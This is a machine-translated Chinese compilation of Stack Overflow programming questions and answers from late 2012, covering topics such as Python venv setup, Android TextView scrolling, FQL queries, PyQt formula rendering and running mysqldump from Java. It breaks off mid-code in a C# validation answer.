## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T13:58:40.363

我的问题是 WMAppManifest.xml 文件中的重复条目

该错误是由 WMAppManifest.xml 文件中的重复功能条目引起的：

```
<Capability Name="ID_CAP_ISV_CAMERA" />
<Capability Name="ID_CAP_SENSORS" />
<Capability Name="ID_CAP_ISV_CAMERA" /> 
```

更正此问题后，问题已解决，应用程序已成功提交。希望这有助于为 Windows Phone 8 开发的人

# ember.js - Ember JS 访问 ember 对象属性的首选方式

> ID：14097421
> 
> 赞同：2
> 
> 时间：2012-12-31T04:25:19.773
> 
> 标签：ember.js

访问 ember 对象属性的首选方法是什么？我经常看到使用 .get() 方法，但想知道为什么人们不只使用点表示法。例如，[在使用 Ember 的建议中，](http://trek.github.com/) Trek 先生写道：

```
connectOutlets: function(router) {
  router.get('applicationController').connectOutlet('myView');
} 
```

但是，以下内容在 ember-1.0.0-pre.2.min.js 中同样有效（在这种情况下不确定版本是否重要）：

```
connectOutlets: function(router) {
  router.applicationController.connectOutlet('myView');
} 
```

有区别吗？还是个人口味的问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T05:19:34.573

裸属性访问仅适用于支持`Object.defineProperty` [https://github.com/emberjs/ember.js/blob/master/packages/ember-metal/lib/accessors.js#L35的浏览器](https://github.com/emberjs/ember.js/blob/master/packages/ember-metal/lib/accessors.js#L35)

# python - 在 Python 3.3 venv (OS X/Homebrew) 中安装分发

> ID：14097423
> 
> 赞同：5
> 
> 时间：2012-12-31T04:25:25.003
> 
> 标签：python, macos, homebrew, python-3.3

我一直在尝试在我的 OS X 机器上启动并运行 Python 3.3 的内置“venv”模块。我已经使用 Homebrew 安装了 Python 3.3。

根据文档，创建和切换虚拟环境按您的预期工作：

```
$ python3 -m venv myvenv
$ source myvenv/bin/activate 
```

我已经测试过这样的东西：

```
$ echo "YEAH = 'YEAH!'" > myvenv/lib/python3.3/site-packages/thingy.py
$ python
>>> import thingy
>>> print(thingy.YEAH)
'YEAH!' 
```

但是当我尝试安装分发时，它根本不会放在正确的位置。出于某种原因，它坚持尝试安装 into `/usr/local/lib/python3.3/site-packages/`，但失败并显示以下消息：

```
No setuptools distribution found
running install
Checking .pth file support in /usr/local/lib/python3.3/site-packages/
/Users/victor/myvenv/bin/python -E -c pass
TEST FAILED: /usr/local/lib/python3.3/site-packages/ does NOT support .pth files
error: bad install directory or PYTHONPATH

You are attempting to install a package to a directory that is not
on PYTHONPATH and which Python does not read ".pth" files from.  The
installation directory you specified (via --install-dir, --prefix, or
the distutils default setting) was:

    /usr/local/lib/python3.3/site-packages/

and your PYTHONPATH environment variable currently contains:

    '' 
```

无论我尝试使用`distribute_setup.py`或直接使用源代码分发安装，都会发生这种情况。我什至尝试过使用`--prefix=/Users/victor/myenv`，但它仍然尝试将所有内容放入我的“全局”站点包中。

我不知道为什么会发生这种情况，但它在我的两台机器上是一致的。注意`sys.prefix`报告正确的路径（虚拟环境）。

这是 Homebrew 的问题吗？操作系统？蟒蛇 3.3？venv? 我？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-06-05T14:13:57.347

是的，这是 Homebrew 的一个问题，但它现在可以使用[https://github.com/mxcl/homebrew/commit/0b50110107ea2998e65011ec31ce45931b446dab](https://github.com/mxcl/homebrew/commit/0b50110107ea2998e65011ec31ce45931b446dab)。

```
$ brew update
$ brew rm python3  #if you have installed it before
$ brew install python3
$ cd /tmp
$ which python3
  /usr/local/bin/python3
$ python3 -m venv myvenv 
$ source myvenv/bin/activate
$ wget http://python-distribute.org/distribute_setup.py  # may need brew install wget
$ python3 distribute_setup.py  
  ...
  Finished processing dependencies for distribute==0.6.45
  After install bootstrap.
  Creating /private/tmp/myvenv/lib/python3.3/site-packages/setuptools-0.6c11-py3.3.egg-info
  Creating /private/tmp/myvenv/lib/python3.3/site-packages/setuptools.pth 
```

您会看到分发安装成功到 /tmp 目录。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-22T09:33:26.650

这是因为`homebrew`安装了 distutils 配置文件：

```
$ brew cat python3  | grep "Tell distutils" -A5
    # Tell distutils-based installers where to put scripts
    (prefix/"Frameworks/Python.framework/Versions/#{VER}/lib/python#{VER}/distutils/distutils.cfg").write <<-EOF.undent
      [install]
      install-scripts=#{scripts_folder}
      install-lib=#{site_packages}
    EOF

$ mv ~/.local/Frameworks/Python.framework/Versions/3.3/lib/python3.3/distutils/distutils.cfg ~/tmp/
$ cat ~/tmp/distutils.cfg 
[install]
install-scripts=/Users/gatto/.local/share/python3
install-lib=/Users/gatto/.local/lib/python3.3/site-packages
$ . venv/bin/activate
(venv) $ python distribute-0.6.36/distribute_setup.py
(venv) $ ls venv/lib/python3.3/site-packages/
distribute-0.6.36-py3.3.egg  easy-install.pth  setuptools-0.6c11-py3.3.egg-info  setuptools.pth 
```

请参阅 bugs.python.org 上的“ [distutils.cfg Can Break venv](http://bugs.python.org/issue17732) ”问题。

# google-app-engine - BadArgumentError：需要一个实例或可迭代的 ( , ); 收到 idofOne (a str)

> ID：14097425
> 
> 赞同：1
> 
> 时间：2012-12-31T04:25:44.377
> 
> 标签：google-app-engine

我不断收到以下错误： BadArgumentError: Expected an instance or iterable of (, ); 收到 idofOne（一个 str）。

并尝试转换为 int() 但随后收到不同的错误消息： ValueError: invalid literal for int() with base 10: ''

到底是怎么回事？我正在使用 Google App Engine - 并从 html 模板中检索 idofOne。它是使用 jinja 的 ID 表示形式——它显示的值为“1”——所以它不应该为空——有什么建议吗？？？

类makeHeadings3（处理程序）：

```
def get(self):
    self.render('new_entries/ADMIN_make_headings3.html')

def post(self):
    idofOne = self.request.get("idofOne")

    type2=self.request.get("type2")
    heading2name = self.request.get("headingTwo")
    description2 = self.request.get("descriptionTwo")

    heading3 = self.request.get("headingThree")

    #getting relevant level 1 entry by id 

    level_1_info=Level_1_Headings.get_by_id(idofOne) 
```

实际上 - 我将来自模板的值从 id() 更改为 key()。但是我发现在我从中检索值的模板中返回的是空字符串“”。为什么？我在模板中看到了键的值，并且正在使用正确的名称“keyofOne”进行检索，那么为什么它会空返回到我的 python 服务器代码？类别 1 的键 不要编辑

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T07:14:59.560

您可以先检查：

```
level_1_info=Level_1_Headings.get_by_id("1") 
```

然后需要在您的代码中添加调试以查看“idofOne”返回的值

```
import logging
# snip
logging.info("type "+type(idofOne))
logging.info("value "+idofOne) 
```

我希望这有帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T11:56:46.960

下面应该修复它。您需要获取该 id 的整数值

```
idofOne = int(self.request.get("idofOne")) 
```

在解析 post 或 get 参数时，您必须在将它们传递给数据存储查询之前将它们转换为正确的类型。

# python - 访问 main 中定义的变量

> ID：14097426
> 
> 赞同：0
> 
> 时间：2012-12-31T04:25:48.493
> 
> 标签：python, python-2.7

我需要一些关于访问 func2 中 main 中定义的 var1 的最佳方式的输入，程序流程如下所示..请告知

```
func2():

 #need to access var1 in func2

func1():

   func2()

def main():

  var1
  func1() 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:29:06.717

您需要将变量标记为[`global`](http://docs.python.org/2/reference/simple_stmts.html#the-global-statement)两个函数中的变量。

```
def func2():
    global var1
    print var1

    var1 = "World"

def func1():
    func2()

def main():
    global var1
    var1 = "Hello"
    func1()

    print var1 
```

输出：

```
Hello
World 
```

* * *

随着问题的回答，有更好的方法来解决这个问题。

*   如果您只需要*读取*中的变量`func2`，则将其作为参数传递，如[Joran Beasley 的回答](https://stackoverflow.com/a/14097461/119527)所示。

*   如果您需要从 中取回值`func2`，则返回值更有意义。

*   如果您必须在各处读取/写入变量，则应重新考虑您的设计。或者，考虑将函数包装在 a 中`class`，并使其成为成员变量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T04:30:41.347

我建议使用参数而不是全局变量......但两者都应该工作

```
def func2(value=None):
 print value
 #need to access var1 in func2

def func1(var_val=None):

   func2(var_val)

def main():

  var1 = "hello";
  func1(var1) 
```

或类级静态变量

```
class config:
   var1=None

def func2(value=None):
 print config.var1
 #need to access var1 in func2

def func1():

   func2()

def main():

  config.var1 = "hello";
  func1() 
```

# facebook - 使用 fql 从 facebook 获取朋友最喜欢的照片

> ID：14097438
> 
> 赞同：2
> 
> 时间：2012-12-31T04:27:47.540
> 
> 标签：facebook, facebook-graph-api, facebook-fql

我正在尝试获取我朋友在 2012 年最喜欢的照片。我做了以下查询。

```
SELECT pid, caption, aid, owner, link, src_big, src_small, created, modified, like_info 
FROM photo WHERE created > 1325356200 and aid 
IN (SELECT aid FROM album WHERE owner
IN (SELECT uid2 FROM friend WHERE uid1=me()))
ORDER BY like_info.like_count DESC LIMIT 30 
```

它按降序给了我最喜欢的 30 张照片。但是当我检查照片时，我可以理解该列表不正确。我朋友最喜欢的一些照片不在列表中。我检查了很多次查询。我不明白这个查询有什么问题。谁能帮我找出为什么这个查询没有给出预期的结果？任何建议都非常受欢迎。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-03T03:51:38.487

问题是由于每个 FQL 查询的默认 LIMIT 值 (LIMIT 100)。

1.  首先**SELECT uid2 FROM friend WHERE uid1=me()**查询运行并输出你的 100 个朋友

2.  其次**，SELECT aid FROM album WHERE owner IN (..100 Friends...)**查询运行并输出 100 个朋友的 s100 个相册。

3.  最后 SELECT **pid, caption,aid, owner, link, src_big, src_small, created, modified, like_info FROM photo WHERE created > 1325356200 and aid IN (...100 Aid...) ORDER BY like_info.like_count DESC LIMIT 30**次查询运行并输出 100 个专辑的结果。

显然结果根本不是你想要的。您可能会尝试自己增加限制（例如 LIMIT 1000），但它对我从来没有用过。获得准确结果的唯一方法是尝试图形 API，但执行起来需要很长时间，最终它是一个死的选择。

我的答案的证明

尝试运行这些代码

```
SELECT pid, caption, aid, owner, link, src_big, src_small, created, modified, like_info 
FROM photo WHERE created > 1325356200 and aid IN (SELECT aid FROM album WHERE owner IN
(SELECT uid2 FROM friend WHERE uid1=me() order by rand() ))ORDER BY like_info DESC LIMIT 30 
```

我使用 rand() 函数来随机化朋友

```
SELECT pid, caption, aid, owner, link, src_big, src_small, created, modified, like_info FROM
photo WHERE created > 1325356200 and aid IN (SELECT aid FROM album WHERE owner IN (SELECT 
uid2 FROM friend WHERE uid1=me() ) order by rand() ) ORDER BY like_info DESC LIMIT 30 
```

在这里，我使用 rand() 来随机化专辑。您可以尝试随机化这两个查询。每次你执行这些代码时，它会给出非常不同的结果，你会注意到有更多的图片和更多的喜欢。

# java - android上textview上的水平滚动？

> ID：14097440
> 
> 赞同：29
> 
> 时间：2012-12-31T04:27:53.190
> 
> 标签：java, android

我正在做一个计算器。我注意到在默认的 android calc 中，您可以水平滚动 textview。我查阅了文档并发现了该属性`android:scrollHorizontally`，但是在将其添加到 textview 之后我仍然无法进行水平滚动，文档上没有关于它的更多信息，导致我认为只添加 attr 就足够了。这是计算器的文本视图：

```
 <TextView android:id="@+id/edit_text"
        android:layout_width="0dip"
        android:layout_height="match_parent"
        android:layout_weight=".8"
        android:singleLine="true"
        android:scrollHorizontally="true"
        android:gravity="center|right"
        android:text="0" /> 
```

当字符超过 textview 宽度时，字符串将被修剪并 ... 出现在它的末尾。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2012-12-31T06:01:14.553

```
<HorizontalScrollView android:layout_width="fill_parent"
    android:layout_height="fill_parent">
    <TextView android:layout_width="40dp"
        android:layout_height="wrap_content"
        android:scrollHorizontally="true"
        android:text="Horizontal scroll view will work now"/>

</HorizontalScrollView> 
```

这就是您可以使 textview 水平滚动的方法。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2019-06-11T16:49:26.573

我有点晚了，但我设法在不添加的情况下达到了相同的结果`HorizontalScrollView`

`EditText`扩展`TextView`以支持滚动和选择。因此，您可以将其`EditText`用作`TextView`（触摸、焦点和光标被禁用）。

```
<EditText
    android:id="@+id/edit_text"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:background="@android:color/transparent" --> This remove that line at the bottom
    android:clickable="false" --> It can be true if you need to handle click events
    android:cursorVisible="false" --> Hide the cursor
    android:focusable="false" --> Disable focus
    android:singleLine="true"
    android:text="This is a very long text that won't be possible to display in a single line"/> 
```

我只是无法在各种设备上进行测试......我只是分享，因为它可能对其他人有用。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2020-08-14T07:48:42.987

就用这个

```
 textview.setMovementMethod(new ScrollingMovementMethod());
   textview.setHorizontallyScrolling(true); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-07-18T11:25:59.817

可能是一个迟到的答案，但可以让 TextView 双向滚动。无需`scrollHorizontally`在 XML 或代码中设置属性。

以下代码根据文本内容使单行或多行 TextView 垂直和水平滚动。

```
<HorizontalScrollView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_below="@+id/toolbar"
        android:scrollbars="none">

        <ScrollView
            android:id="@+id/scroll_view"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:padding="10dp"
            android:scrollbars="none">

            <androidx.appcompat.widget.AppCompatTextView
                android:id="@+id/text_content"
                fontPath="fonts/roboto_medium.ttf"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:textColor="@color/primary_text"
                android:textSize="14sp" />

        </ScrollView>
</HorizontalScrollView> 
```

注意`layout_width`for`ScrollView`和`TextView`设置为`wrap_content`。的 Width`HorizontalScrollView`可以是`wrap_content`或`match_parent`没有效果。

# opengl - 我可以使用 OpenGL 进行通用矩阵乘法吗？

> ID：14097442
> 
> 赞同：2
> 
> 时间：2012-12-31T04:28:33.770
> 
> 标签：opengl, matrix-multiplication

MultMatrix 似乎只乘以 4x4 矩阵，这对于 OpenGL 的目的是有意义的，但我想知道 OpenGL 中是否存在更通用的矩阵乘法函数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:37:10.447

不，可以通过查看[文档](http://www.opengl.org/documentation/)轻松验证，包括[GL Shader Language](http://www.opengl.org/documentation/glsl/)。最大的矩阵数据类型是 4x4。

确实，通过以非常棘手的方式使用 OpenGL 原语，让 GPU 进行更通用的数学运算，包括用于加密目的的字符串和文本操作是一整套工艺。但是，您要求使用通用矩阵乘法函数。

[OpenCL 是一个不同的故事](http://www.khronos.org/opencl/)。它没有乘法原语，但它是为一般数值计算而设计的，因此示例和库非常常见。

您还可以轻松地在[CUDA](http://www.nvidia.com/object/cuda_home_new.html)中为 NVIDIA 处理器编写通用矩阵乘法。他们的教程包括这样一个例程的设计。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T08:36:43.657

很多人认为，传统 OpenGL（直到 OpenGL-2.1）的矩阵乘法在某种程度上会更快。不是这种情况。固定函数流水线矩阵操作函数都在 CPU 上执行，并且只在绘图调用之前按需更新 GPU 矩阵寄存器。

使用 OpenGL 进行矩阵数学乘法没有任何好处。如果你想做 GPGPU 计算，你必须使用 OpenCL 或计算着色器来做这件事，并且要真正从中受益，它必须应用于一个非常好的并行化问题。

# python - Python 2.7 上 web.py 的 OperationalError

> ID：14097454
> 
> 赞同：0
> 
> 时间：2012-12-31T04:29:50.907
> 
> 标签：python, python-2.7, web.py

我一直在使用 web.py 和 Python 2.4。我已经迁移到 Python 2.7 并且收到了一个错误：

> OperationalError: (2006, 'MySQL server has gone away')

这与 web.py 有关吗？[webpy 安装指南](http://webpy.org/installation)说：

> `web.py`支持 Python 2.4 – 2.6 并且没有直接的先决条件。

# python - 在 PyQt 中（很好地）显示代数表达式

> ID：14097463
> 
> 赞同：6
> 
> 时间：2012-12-31T04:30:47.440
> 
> 标签：python, pyqt4, formula, markup, algebra

在我的 python 程序中是我创建的数学对象的层次结构，它们代表数学公式。
例如，有`Collection`，它是一系列`Equations`，它是两个`Sums`、`Products`、或的容器`Quotients`，它们都是在 上建立的，可以是数字或变量。`Exponants``Logarithms``Figures`

我需要向用户显示要执行的数学运算步骤以实现某些任务，例如获取未知变量等。目前，我以纯文本格式生成此“指南”，就像...

```
F = (m)(a)  
m = (F)/(a)  
a = 2, F = 3  
m = (3)/(2) = 1.5 
```

然而，用纯文本（例如：）表示复杂的公式`log[2](n)=(m)((a)^(2))`是丑陋的，并且违背了程序的目标，即为用户保持程序的最高清晰度。

我目前正在用 PyQt4 编写 GUI，并且需要表示可以在 Qt 应用程序中显示的公式（每个步骤）。公式不需要在文本中。由于对象结构，根据需要将对象转换为标记文本非常容易。实际的显示方法可以是任何东西，只要我可以在我的 GUI 中干净利落地放置它，例如 SVG、图像等。

*   起初，我考虑过 MathML，但读到 PyQt 在显示 HTML 时会忽略 MathML 标签，并且曾经存在用于此确切任务的 QMmlWidget，但已被弃用。
*   然后我读到了一个组合`sympy`，`svgmath`并`QSvgWidget`工作，将公式显示为 Svgs，但我需要我的代码是可分发的，设置 svgmath 时的字体配置内容会阻止它。
*   我认为这看起来很有希望：[Display LaTeX Equations in-line with terminal](https://stackoverflow.com/questions/9756335/display-latex-equations-in-line-with-terminal) ，但视频总时长将近 4 小时，对此我没有耐心。

我几乎倾向于自己编写代码，使用 PIL 或类似的东西将我的数学对象直接转换为图像，但我不想认为有人已经通过更好的工作实现了这一点。

非常感谢任何和所有帮助！
谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2017-06-16T15:57:01.980

来自博客[Gulon.co.uk](http://www.gulon.co.uk/2013/05/01/pretty-math-formulae-with-pyqt4-and-matplotlib/)。她提供了一个简单但功能强大的示例，用于在 pyQt 中渲染 LateX 方程。我从那里复制并粘贴在下面：

```
from PyQt4.QtCore import *

from PyQt4.QtGui import *

from matplotlib.figure import Figure
from matplotlib.backends.backend_qt4agg import FigureCanvasQTAgg as FigureCanvas

class MathTextLabel(QWidget):

    def __init__(self, mathText, parent=None, **kwargs):
        QWidget.__init__(self, parent, **kwargs)

        l=QVBoxLayout(self)
        l.setContentsMargins(0,0,0,0)

        r,g,b,a=self.palette().base().color().getRgbF()

    self._figure=Figure(edgecolor=(r,g,b), facecolor=(r,g,b))
    self._canvas=FigureCanvas(self._figure)
    l.addWidget(self._canvas)

    self._figure.clear()
    text=self._figure.suptitle(
        mathText,
        x=0.0,
        y=1.0,
        horizontalalignment='left',
        verticalalignment='top',
        size=qApp.font().pointSize()*2)
    self._canvas.draw()

    (x0,y0),(x1,y1)=text.get_window_extent().get_points()
    w=x1-x0; h=y1-y0

    self._figure.set_size_inches(w/80, h/80)
    self.setFixedSize(w,h)

if __name__=='__main__':
    from sys import argv, exit

    class Widget(QWidget):
        def __init__(self, parent=None, **kwargs):
            QWidget.__init__(self, parent, **kwargs)

            l=QVBoxLayout(self)
            l.addWidget(QLabel("<h1>Discrete Fourier Transform</h1>"))

            mathText=r'$X_k = \sum_{n=0}^{N-1} x_n . e^{\frac{-i2\pi kn}{N}}$'
            l.addWidget(MathTextLabel(mathText, self),     alignment=Qt.AlignHCenter)

    a=QApplication(argv)
    w=Widget()
    w.show()
    w.raise_()
    exit(a.exec_()) 
```

* * *

翻译成 PyQt5

```
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QVBoxLayout
from PyQt5.QtCore import Qt
from matplotlib.figure import Figure
from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas

class MathTextLabel(QtWidgets.QWidget):

    def __init__(self, mathText, parent=None, **kwargs):
        super(QtWidgets.QWidget, self).__init__(parent, **kwargs)

        l=QVBoxLayout(self)
        l.setContentsMargins(0,0,0,0)

        r,g,b,a=self.palette().base().color().getRgbF()

        self._figure=Figure(edgecolor=(r,g,b), facecolor=(r,g,b))
        self._canvas=FigureCanvas(self._figure)
        l.addWidget(self._canvas)
        self._figure.clear()
        text=self._figure.suptitle(
            mathText,
            x=0.0,
            y=1.0,
            horizontalalignment='left',
            verticalalignment='top',
            size=QtGui.QFont().pointSize()*2
        )
        self._canvas.draw()

        (x0,y0),(x1,y1)=text.get_window_extent().get_points()
        w=x1-x0; h=y1-y0

        self._figure.set_size_inches(w/80, h/80)
        self.setFixedSize(w,h)

if __name__=='__main__':
    from sys import argv, exit

    class Widget(QtWidgets.QWidget):
        def __init__(self, parent=None, **kwargs):
            super(QtWidgets.QWidget, self).__init__(parent, **kwargs)

            l=QVBoxLayout(self)
            mathText=r'$X_k = \sum_{n=0}^{N-1} x_n . e^{\frac{-i2\pi kn}{N}}$'
            l.addWidget(MathTextLabel(mathText, self), alignment=Qt.AlignHCenter)

    a=QtWidgets.QApplication(argv)
    w=Widget()
    w.show()
    w.raise_()
    exit(a.exec_()) 
```

# css - 用css和其中的任何东西制作一个浮动div

> ID：14097465
> 
> 赞同：1
> 
> 时间：2012-12-31T04:31:00.800
> 
> 标签：css

我想制作一个类似于 facebook 的浮动菜单，带有 css，没有动画，一直直接连接到顶部，我有这个 div

```
 <div id="topmenu">

<ul class="topmenu_buttons">
<li class="home"><a href="#">Home</a></li>
<li class="Change_Location"><a href="#">loaction</a></li>
<li class="Help_Topmenu"><a href="#">help</a></li>
</ul>

</div> 
```

我的 css 文件已经制作但为空，但我想快速解释一下如何将 css 中的这三个链接排列为一个列表，并以列表的方式使用一个小的普通字体，一个在另一个之上，都在一个黑色的 div 中链接位于左侧，但距离左侧有几个像素，并且如果可以在 div 上应用浮动 css 效果 (((postion:fixed ))))，则它适用于其上的所有内容，如果不可能的话然后如何将它也应用于链接以及如何使它看起来有点像 facebook 但黑色和稍微更大更厚我一直在尝试使用我的 css 笔记但它对我不起作用我不知道我做错了什么

谢谢我基本上想要外部文件的css代码而不是内联样式

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:34:48.463

那应该做你想做的一切：

```
#topmenu{
    position:fixed;
    top:0;
    background:#000;
    width:100%;
    height:50px;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T04:43:18.033

```
#menu {
    postion:fixed;
    top:0;
    background:#3B5998; same color as fb has
    width:100%;
    height:46px;
    left:0;
    z-index:2; //give this so, your header or menu will not get under content!
} 
```

# android - 当 EditText 为空时会发生什么？

> ID：14097466
> 
> 赞同：-5
> 
> 时间：2012-12-31T04:31:13.643
> 
> 标签：android, android-edittext, nullreferenceexception

我有这样的方法：

```
public String get_Rid_something () {return((EditText)mParent.findViewById(Rid_something)).getText().toString();} 
```

如果EditText框中没有文字，会发生什么，会不会有异常？或者 toString() 会毫无例外地返回字符串的 null 吗？

我有一堆这样的，所以我想有效地修复每一个，这样如果文本为空，它们就会返回“0”——希望不要用 try...catch 构造括起来。

有没有我可以放在那里的“if”语句来查看字符串是否为空，如果是则返回“0”？我可以做类似的事情：

```
if (((EditText)mParent.findViewById(Rid_something)).getText().toString().isEmpty()) {
    return "0"; } else {...} 
```

还有其他更好的方法来做到这一点吗？

蒂亚！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T04:38:15.973

如果 EditText 没有内容，它会返回一个空字符串，或者一个 "" 以返回 0，只需设置一个 if 语句：

```
EditText editText = (EditText) mParent.findViewById(Rid_something);
String string = editText.getText().toString().trim();
if (string.equals("")) {
    return "0"; 
} else {
    return string;
} 
```

如果为空，则返回 0，否则返回内容。

# mysql - 选择过滤条件及其计数

> ID：14097470
> 
> 赞同：1
> 
> 时间：2012-12-31T04:32:29.087
> 
> 标签：mysql, sql, select

我有两张桌子：

桌子`Filters`

```
id   INT(11) PRIMARY KEY
text VARCHAR(50) 
```

桌子`items`

```
id    INT(11) PRIMARY KEY
title VARCHAR(255) 
```

我想显示所有过滤器术语以及它们在标题中出现的次数

我目前正在使用此语句，但计数为零

```
SELECT  filters.text, 
        (SELECT COUNT(items.id) 
         FROM items 
         WHERE (items.title LIKE 'filters.text' OR 
                items.title LIKE '%filters.text' OR 
                items.title LIKE '%filters.text%' OR 
                items.title LIKE 'filters.text%')
        ) AS count
        FROM filters, items
GROUP BY filters.ID
ORDER BY filters.ID DESC 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T04:37:33.287

试试这个，

```
SELECT  a.text, COUNT(b.id) totalCount
FROM    filters a
        LEFT JOIN items b
            ON b.title LIKE CONCAT('%',a.text,'%')
GROUP BY a.text
ORDER BY totalCount DESC 
```

*   [SQLFiddle 演示链接](http://sqlfiddle.com/#!2/a2ad8/1)

# java - 如何使用 GAE 将文件从 android 应用程序上传到 google 应用程序引擎

> ID：14097472
> 
> 赞同：1
> 
> 时间：2012-12-31T04:33:06.773
> 
> 标签：java, android, google-app-engine

我有一个 JSP 文件，表单字段会将文件上传到 Google 应用引擎，下面的代码显示了它，

```
 <form name="myform" id="myform" action="<%= blobstoreService.createUploadUrl("/adminupload",UploadOptions.Builder.withGoogleStorageBucketName("sampleapp")) %>" method="post" enctype="multipart/form-data"> 
```

当我用 jsp 和 servlet 编写这个程序时，我需要在 android 应用程序中提供相同的过程。如果我的 GAE 路径是这样说的[http://sampleapp.appspot.com/Upload.jsp](http://sampleapp.appspot.com/Upload.jsp)我怎么能在 android 应用程序的表单操作属性中提供这个链接。因为我对android应用程序一无所知。请建议我在 android 应用程序表单属性中提供什么，以便可以从应用程序上传文件。

请告诉我是否有可能以 android 形式提供这样的 url 路径，

```
http://sampleapp.appspot.com/uploadservlet 
```

这样android应用就会上传GAE sampleapp.appspot.com中的文件

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T04:43:33.637

是的。通过在构造函数中传递您的服务器 URL 来使用[HttpPost 对象](http://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/client/methods/HttpPost.html)。

```
HttpPost request = new HttpPost(urlString); 
```

**[编辑]：**刚刚注意到您使用了多部分条目。我建议你做一些[本教程中解释的](http://evgeny-goldin.com/blog/uploading-files-multipart-post-apache/)事情。

当您将 url 作为参数传递时，您是在告诉 Java 您的请求的目的地。因此，您的请求必须包含您的文件数据（以您希望[DataOutputStream](http://developer.android.com/reference/java/io/DataOutputStream.html)或任何其他方式编写的任何方式），然后您必须[使用 HttpClient 对象执行它](http://developer.android.com/reference/org/apache/http/client/HttpClient.html)。

此外，从[JSP 上的 GAE 页面中，](https://developers.google.com/appengine/docs/java/gettingstarted/usingjsps)您可以看到`<form action="/handleName" method="methodName">`您添加的每个新内容都会导致：

> .. 一个新的 URL，/handleName，由一个新的 servlet 类处理...

# java - 在linux中从java运行mysqldump

> ID：14097473
> 
> 赞同：0
> 
> 时间：2012-12-31T04:33:12.113
> 
> 标签：java, mysqldump, runtime.exec

** 直接在终端上运行以下命令可以正常工作

```
mysqldump -uabc -pabc1234 --compact --no-create-info -w \"fieldname != 'A'\" dbname tablename -hhostaddress --result-file=/tmp/myfile.txt 
```

** 但是当它使用 Runtime() 方法执行时，它不会在目标文件中产生输出。

```
String s="mysqldump -uabc -pabc1234 --compact --no-create-info -w \"fieldname != 'A'\" dbname tablename -hhostaddress --result-file=/tmp/myfile.txt";
Runtime.getRuntime().exec(s); 
```

(** 说 abc 是用户名， abc1234 是密码)

如果使用重定向到目标文件 ( > ) 而不是 --result-file 选项，则会出现同样的问题。我应该怎么做才能从 java 程序中执行它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T04:45:02.297

对于我使用的未归档文件

```
final Runtime r = Runtime.getRuntime();
            final Process p = r.exec("/bin/tar -xvf " + zipFile, null, fileDir); 
```

其中 zipFile - 目标文件名，fileDir - 当前目录路径（需要放置文件的位置）

我还使用了“/bin/tar”，因为直接“tar”在 Runtime.exec 环境中被隐藏了。也尝试使用直接路径（仅用于测试）。

对于日志，只需在末尾添加下一个

```
 final int returnCode = p.waitFor();

        if (logger.isDebugEnabled()) {
            final BufferedReader is = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = is.readLine()) != null) {
                logger.debug(line);
            }
            final BufferedReader is2 = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((line = is2.readLine()) != null) {
                logger.debug(line);
            }
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T04:42:50.407

使用可以更好地处理空格的[ProcessBuilder api。](http://docs.oracle.com/javase/6/docs/api/java/lang/ProcessBuilder.html)输出将在结果文件中。

```
 new ProcessBuilder( "mysqldump" , "-uabc", "-pabc1234", ... ).start(); 
```

'>' 是 Shell 间接 - 如果您的程序是 shell，它可以工作。

```
new ProcessBuilder( "bash", -"c "mysqldump" , "-uabc", "-pabc1234", ..., "> fileresult"  ).start(); 
```

# c# - 如何将验证属性应用于集合中的对象？

> ID：14097474
> 
> 赞同：5
> 
> 时间：2012-12-31T04:33:31.907
> 
> 标签：c#, validation, collections, .net-4.5

基本上，如果我有一个对象集合，如何将验证属性应用于集合中的每个项目（例如`MaxLengthAttribute`）？

```
public class Foo
{
    public ICollection<string> Bars { get; set; }
} 
```

例如，如何确保*Bars*包含验证最大长度为 256 的字符串？

更新：

我了解如何在单个属性上应用验证属性，但问题是如何将其应用到**集合中的**对象上。

```
public class Foo
{
    [StringLength(256)] // This is obvious
    public string Bar { get; set; }

    // How do you apply the necessary attribute to each object in the collection!
    public ICollection<string> Bars { get; set; }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-08-25T16:40:15.637

我知道这个问题有点老了，但也许有人来寻找答案。

我不知道将属性应用于集合项的通用方法，但是对于特定的字符串长度示例，我使用了以下内容：

```
public class StringEnumerationLengthValidationAttribute : StringLengthAttribute
{
    public StringEnumerationLengthValidationAttribute(int maximumLength)
        : base(maximumLength)
    { }

    public override bool RequiresValidationContext { get { return true; } }
    public override bool IsValid(object value)
    { return false; }

    protected override ValidationResult IsValid(object value, ValidationContext validationContext)
    {
        var e1 = value as IEnumerable<string>;
        if (e1 != null) return IsEnumerationValid(e1, validationContext);
